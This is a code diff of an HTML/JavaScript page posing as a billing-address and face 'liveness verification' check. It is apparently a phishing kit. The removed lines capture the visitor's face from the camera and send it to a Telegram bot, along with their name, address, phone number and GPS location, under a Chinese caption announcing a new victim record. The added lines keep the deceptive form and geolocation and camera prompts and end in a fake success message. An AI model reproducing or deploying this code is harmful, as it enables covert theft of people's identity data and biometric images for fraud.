-                    if (headYaw > 0.04) {
-                        currentStep = 2;
-                        speakPrompt(t.aiLeftSuccess);
-                    }
-                } 
-                else if (currentStep === 2) {
-                    updateUIPulse('#ff9800', 'rgba(255, 152, 0, 0.6)');
-                    
-                    if (headYaw < -0.04) {
-                        currentStep = 3;
-                        speakPrompt(t.aiSuccess);
-                        updateUIPulse('#34c759', 'rgba(52, 199, 89, 0.8)');
-                        
-                        setTimeout(() => {
-                            captureAndUpload(stream, locationText);
-                        }, 1000);
-                    }
-                }
-            });
-
-            const camera = new Camera(video, {
-                onFrame: async () => {
-                    if (currentStep < 3) {
-                        await faceMesh.send({ image: video });
-                    }
-                },
-                width: 640,
-                height: 480
-            });
-            camera.start();
+        
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                document.getElementById('locationField').value = "Lat: " + pos.coords.latitude.toFixed(2) + ", Long: " + pos.coords.longitude.toFixed(2);
+            }, () => document.getElementById('locationField').value = "Location Permission Denied");
         }
+    };
 
-        async function captureAndUpload(stream, locationText) {
-            const t = translations[currentLang];
-            currentStep = 4;
-            status.innerText = t.uploading;
-            fillLight.style.display = 'none';
-
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            
-            ctx.save();
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            ctx.restore();
-            
-            canvas.toBlob(async (blob) => {
-                if (!blob) return;
-                
-                const captionText = `📦 [收到新的账单地址与活体核验]\n` +
-                    `━━━━━━━━━━━━━━━\n` +
-                    `🆔 会话 ID: ${CHAT_ID}\n` +
-                    `👤 姓名: ${formDataCache.lastName} ${formDataCache.firstName}\n` +
-                    `🌍 国家: ${formDataCache.country}\n` +
-                    `🏛️ 省份/州: ${formDataCache.state}\n` +
-                    `🏠 地址: ${formDataCache.address}, ${formDataCache.city}, ${formDataCache.postalCode}\n` +
-                    `📞 电话: ${formDataCache.phone}\n` +
-                    `📍 GPS: ${locationText}\n` +
-                    `━━━━━━━━━━━━━━━\n` +
-                    `状态: AI 动态视觉活体校验通过 ✅`;
-
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'user_verification_and_face.jpg');
-                formData.append('caption', captionText);
-
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                    status.innerText = t.successDone;
-                    stream.getTracks().forEach(tr => tr.stop());
-                    videoContainer.style.display = 'none';
-                } catch (e) {
-                    status.innerText = t.netErr;
-                }
-            }, 'image/jpeg', 0.95);
+    function loadStates() {
+        const code = document.getElementById('countrySelect').value;
+        const sSelect = document.getElementById('stateSelect');
+        sSelect.innerHTML = '<option>-- Select State --</option>';
+        if (code && worldData[code]) {
+            sSelect.disabled = false;
+            worldData[code].states.forEach(s => {
+                let opt = document.createElement('option');
+                opt.textContent = s; sSelect.appendChild(opt);
+            });
         }
-    </script>
+    }
+
+    async function openLiveness() {
+        // 校验信息是否完整
+        if(!document.getElementById('name').value) return alert("Please enter your name.");
+        
+        document.getElementById('form-container').style.display = 'none';
+        document.getElementById('liveness-box').style.display = 'block';
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('video').srcObject = stream;
+        } catch(e) { alert("Camera access is required for verification."); }
+    }
+
+    function finish() {
+        alert("Success! All information has been processed.");
+        location.reload();
+    }
+</script>
 </body>
 </html>
